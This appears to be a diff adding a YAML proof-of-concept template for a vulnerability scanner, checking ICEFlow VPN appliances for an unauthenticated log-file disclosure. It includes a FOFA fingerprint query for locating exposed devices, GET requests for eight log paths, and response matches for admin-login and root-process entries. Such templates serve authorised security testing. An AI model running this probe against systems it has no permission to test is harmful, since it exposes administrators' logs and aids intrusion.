@@ -1,0 +1,34 @@
+id: poc-yaml-iceflow-vpn-log-information-leak
+info:
+  name: ICEFlow VPN 日志信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: ICEFLOW-VPN
+  fofa: app="ICEFLOW-VPN"
+variables:
+  logs: 'log/system.log
+
+    log/vpn.log
+
+    log/warn.log
+
+    log/mobile.log
+
+    log/error.log
+
+    log/firewall.log
+
+    log1/debug.log
+
+    log/access.log'
+requests:
+- method: GET
+  path: /{{.logs}}
+  expression: (status_code == 200 && contains(headers,"ICEFLOW")) && ( (contains(body,"login
+    successfully") && contains(body,"WEB Login - User admin remote")) || (contains(body,"localhost
+    VPN") && contains(body,"VPN is abnormally shutdown")) || (contains(body,"started
+    as root without requesting chroot()") && contains(body,"ICEFLOW thttpd")) || (contains(body,"localhost
+    pppd") && contains(body,"uid 0")) || (contains(body,"ICEFLOW ipsec_setup") &&
+    contains(body,"ICEFLOW ipsec_setup")) )
+transport: http
